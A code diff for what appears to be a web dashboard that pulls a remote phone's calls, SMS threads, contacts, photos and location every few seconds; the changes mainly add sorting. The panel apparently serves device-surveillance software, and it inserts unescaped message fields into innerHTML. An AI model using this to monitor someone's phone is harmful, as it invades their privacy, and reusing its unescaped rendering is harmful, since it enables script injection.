@@ -66,10 +66,7 @@ function selectDevice(deviceId) {
     if (dataInterval) clearInterval(dataInterval);
     
     if (deviceId) {
-        // تحديث الحالة كل 3 ثوانٍ
         updateInterval = setInterval(updateLiveData, 3000);
-        
-        // تحديث البيانات الكاملة كل 5 ثوانٍ
         dataInterval = setInterval(() => {
             if (currentDevice) {
                 loadAllData();
@@ -171,9 +168,12 @@ function displayCallsList() {
         return;
     }
     
+    // ✅ ترتيب حسب التاريخ تنازلي (الأحدث أولًا)
+    const sortedCalls = [...allCalls].sort((a, b) => (b.date || 0) - (a.date || 0));
+    
     // تجميع حسب الرقم
     const callGroups = {};
-    allCalls.forEach(call => {
+    sortedCalls.forEach(call => {
         const number = call.number || 'غير معروف';
         if (!callGroups[number]) {
             callGroups[number] = [];
@@ -183,7 +183,7 @@ function displayCallsList() {
     
     Object.keys(callGroups).forEach(number => {
         const calls = callGroups[number];
-        const lastCall = calls[0]; // الأحدث لأن الترتيب DESC
+        const lastCall = calls[0];
         
         const div = document.createElement('div');
         div.className = 'conversation-item';
@@ -191,7 +191,7 @@ function displayCallsList() {
         div.innerHTML = `
             <div class="conversation-avatar">📞</div>
             <div class="conversation-info">
-                <div class="conversation-name">${number}</div>
+                <div class="conversation-name">${lastCall.name || number}</div>
                 <div class="conversation-preview">
                     ${getCallType(lastCall.type)} • ${formatDuration(lastCall.duration)} • ${formatDate(lastCall.date)}
                 </div>
@@ -211,7 +211,10 @@ function openCallDetail(number) {
     const detailsDiv = document.getElementById('callDetailsList');
     detailsDiv.innerHTML = '';
     
-    const calls = allCalls.filter(call => call.number === number);
+    // ✅ ترتيب حسب التاريخ تنازلي
+    const calls = allCalls
+        .filter(call => call.number === number)
+        .sort((a, b) => (b.date || 0) - (a.date || 0));
     
     calls.forEach(call => {
         const div = document.createElement('div');
@@ -260,9 +263,11 @@ function displayConversations() {
         return;
     }
     
-    // تجميع حسب الرقم
+    // ✅ ترتيب حسب التاريخ تنازلي (الأحدث أولًا)
+    const sortedSMS = [...allSMS].sort((a, b) => (b.date || 0) - (a.date || 0));
+    
     const conversations = {};
-    allSMS.forEach(sms => {
+    sortedSMS.forEach(sms => {
         const number = sms.address || 'غير معروف';
         if (!conversations[number]) conversations[number] = [];
         conversations[number].push(sms);
@@ -270,7 +275,7 @@ function displayConversations() {
     
     Object.keys(conversations).forEach(number => {
         const messages = conversations[number];
-        const lastMessage = messages[0]; // الأحدث لأن الترتيب DESC
+        const lastMessage = messages[0];
         
         const div = document.createElement('div');
         div.className = 'conversation-item';
@@ -296,10 +301,10 @@ function openChat(number) {
     const messagesList = document.getElementById('messagesList');
     messagesList.innerHTML = '';
     
-    const chatMessages = allSMS.filter(sms => sms.address === number);
-    
-    // ترتيب من الأقدم للأحدث داخل المحادثة
-    chatMessages.reverse();
+    // ✅ ترتيب من الأقدم للأحدث (مثل واتساب)
+    const chatMessages = allSMS
+        .filter(sms => sms.address === number)
+        .sort((a, b) => (a.date || 0) - (b.date || 0));
     
     chatMessages.forEach(sms => {
         const div = document.createElement('div');
@@ -351,7 +356,11 @@ function displayContactsList() {
         return;
     }
     
-    allContacts.forEach(contact => {
+    // ✅ ترتيب أبجدي
+    const sortedContacts = [...allContacts].sort((a, b) => 
+        (a.name || '').localeCompare(b.name || '', 'ar'));
+    
+    sortedContacts.forEach(contact => {
         const numbers = Array.isArray(contact.numbers) ? contact.numbers : [contact.numbers];
         
         const div = document.createElement('div');
@@ -419,25 +428,24 @@ async function loadImages() {
             return;
         }
         
-        images.forEach((image, index) => {
+        // ✅ ترتيب حسب التاريخ تنازلي
+        const sortedImages = [...images].sort((a, b) => (b.date || 0) - (a.date || 0));
+        
+        sortedImages.forEach((image, index) => {
             const div = document.createElement('div');
             div.className = 'image-item';
             
             const img = document.createElement('img');
             
-            // عرض الصورة من Base64
             if (image.data) {
-                // تحديد نوع الصورة
                 let mimeType = 'image/jpeg';
                 if (image.name) {
                     const ext = image.name.toLowerCase().split('.').pop();
                     if (ext === 'png') mimeType = 'image/png';
-                    else if (ext === 'gif') mimeType = 'image/gif';
                     else if (ext === 'webp') mimeType = 'image/webp';
                 }
                 img.src = `data:${mimeType};base64,${image.data}`;
             } else {
-                // صورة بديلة
                 img.src = 'data:image/svg+xml,' + encodeURIComponent('<svg xmlns="http://www.w3.org/2000/svg" width="150" height="150"><rect width="150" height="150" fill="#1a1a4e"/><text x="75" y="75" text-anchor="middle" fill="#888" font-size="30">📷</text></svg>');
             }
             
@@ -518,7 +526,6 @@ function showLocationDetails(location) {
         div.innerHTML = `
             <p>📍 خط العرض: ${location.latitude.toFixed(6)}</p>
             <p>📍 خط الطول: ${location.longitude.toFixed(6)}</p>
-            <p>📏 الدقة: ${location.accuracy ? location.accuracy + ' متر' : '—'}</p>
         `;
     }
 }
